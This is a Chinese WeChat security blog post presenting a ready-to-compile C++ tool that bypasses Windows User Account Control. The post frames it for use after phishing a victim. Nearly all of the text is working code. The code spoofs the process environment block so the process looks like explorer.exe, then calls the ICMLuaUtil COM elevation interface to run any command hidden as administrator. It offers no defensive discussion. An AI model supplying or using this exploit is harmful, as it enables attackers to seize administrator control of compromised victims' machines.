#  Bypass Uac分享

原创 小黑  [ 小黑说安全 ](javascript:void\(0\);)

**小黑说安全** ![]()

微信号 Xxia0hei04

功能介绍 攻防、审计、物联网、车联网研究

____

___发表于_

收录于合集

## **前言  
**

  

  

  

  

  

先介绍一个bypass
uac的场景，在gf的场景，如果目标的外网资产打不动的话，一般情况就会采用社工钓鱼，但是一般情况下目标点击我们的马子通常是以当前用户的普通权限运行的(当然也可以在做马的时候设置UAC执行级别为requireAdministrator)，如果目标用户在管理员组那就可以通过uac来提权了，那下面就分享一个bypass
uac的代码，通过伪PEB+ICMLuaUtil，X86的选择好直接复制粘贴生成。

##  **代码**

  

  

  

  

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     #include "windows.h"#include "winternl.h"#include <iostream>  
    using namespace std;  
    // 定义接口 ICMLuaUtil 和其方法typedef interface ICMLuaUtil ICMLuaUtil;typedef struct ICMLuaUtilVtbl {  BEGIN_INTERFACE    HRESULT(STDMETHODCALLTYPE* QueryInterface)(      __RPC__in ICMLuaUtil* This,      __RPC__in REFIID riid,      _COM_Outptr_  void** ppvObject);  ULONG(STDMETHODCALLTYPE* AddRef)(    __RPC__in ICMLuaUtil* This);  ULONG(STDMETHODCALLTYPE* Release)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(    __RPC__in ICMLuaUtil* This);  
      // incomplete definition  HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(    __RPC__in ICMLuaUtil* This);  
      HRESULT(STDMETHODCALLTYPE* ShellExec)(    __RPC__in ICMLuaUtil* This,    _In_     LPCTSTR lpFile,    _In_opt_  LPCTSTR lpParameters,    _In_opt_  LPCTSTR lpDirectory,    _In_      ULONG fMask,    _In_      ULONG nShow);  END_INTERFACE} *PICMLuaUtilVtbl;  
    interface ICMLuaUtil {  CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;};  
      
    // 以管理员权限运行指定的命令HRESULT RunElevated(LPCWSTR lpCmdline) {  HRESULT status = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);  ICMLuaUtil* CMLuaUtil = NULL;  IID xIID_ICMLuaUtil;  LPCWSTR lpIID = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";  IIDFromString(lpIID, &xIID_ICMLuaUtil);  BIND_OPTS3 bop;  
      ZeroMemory(&bop, sizeof(bop));  
      if (!SUCCEEDED(status))    return status;  
      // 使用CoGetObject方法获取ICMLuaUtil接口的实例  // 这里尝试获取Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}的对象实例，该接口通常用于执行以管理员权限运行的操作  bop.cbStruct = sizeof(bop);  bop.dwClassContext = CLSCTX_LOCAL_SERVER;  status = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*)&bop, xIID_ICMLuaUtil, (VOID**)&CMLuaUtil);  
      if (status != S_OK)    return status;  
      // 构造带有 "/c" 命令的命令行  wstring cmdLineWithC = L"/c " + wstring(lpCmdline);  
      // 以隐藏方式运行指定的命令  status = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd.exe", cmdLineWithC.c_str(), NULL, SEE_MASK_DEFAULT, SW_HIDE);  
      if (CMLuaUtil != NULL) {    CMLuaUtil->lpVtbl->Release(CMLuaUtil);  }  
      return status;}  
      
    // 修改进程参数和Ldr的内容，以运行指定路径的应用程序VOID ChangeProcessParametersAndLdr(PUNICODE_STRING name, LPCWSTR lpExplorePath) {  typedef VOID(WINAPI* RtlInitUnicodeString)(_Inout_  PUNICODE_STRING DestinationString, _In_opt_ PCWSTR SourceString);  RtlInitUnicodeString pfnRtlInitUnicodeString = NULL;  
      HMODULE hDll = LoadLibrary(L"ntdll.dll");  pfnRtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");  
      // 使用RtlInitUnicodeString方法来初始化UNICODE_STRING结构体，修改其内容  pfnRtlInitUnicodeString(name, lpExplorePath);}  
    int main() {  int nArgs = 0;  LPWSTR* lpParam = NULL;  HRESULT status = NULL;  PPEB ppeb = NULL;  DWORD* pFullDllName = NULL, pBaseDllName = NULL;  
      // 解析命令行参数，获取要运行的命令  lpParam = CommandLineToArgvW(GetCommandLine(), &nArgs);  if (nArgs <= 1) {    cout << "uacbypass.exe [cmd]";    return 0;  }  
      LPWSTR lpCmdline = *(lpParam + 1);  
      LPWSTR lpExplorePath = new WCHAR[MAX_PATH];  GetWindowsDirectory(lpExplorePath, MAX_PATH);  lstrcat(lpExplorePath, L"\\explorer.exe");  
      // 获取PEB（Process Environment Block）的相关字段地址  __asm {    push eax    mov eax, fs:[0x30]    mov ppeb, eax    mov eax, [eax + 0x0c]    mov eax, [eax + 0x0c]  
        add eax, 0x24    mov pFullDllName, eax  
        sub eax, 0x24    add eax, 0x2c    mov pBaseDllName, eax  
        pop eax  }  
      // 修改进程的ImagePathName、CommandLine、FullDllName、BaseDllName字段，指向系统的explorer.exe路径  ChangeProcessParametersAndLdr(&ppeb->ProcessParameters->ImagePathName, lpExplorePath);  ChangeProcessParametersAndLdr(&ppeb->ProcessParameters->CommandLine, lpExplorePath);  ChangeProcessParametersAndLdr((PUNICODE_STRING)((unsigned char*)pFullDllName), lpExplorePath);  ChangeProcessParametersAndLdr((PUNICODE_STRING)((unsigned char*)pBaseDllName), lpExplorePath);  
      // 以管理员权限运行指定的命令  status = RunElevated(lpCmdline);  
      if (SUCCEEDED(status))    cout << "success!";  
      return 0;}

##  **效果**

  

  

  

  

  

  

![]()![]()

 **总结**

##

  

  

  

  

  

  

害，没啥好总结的，下课！

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

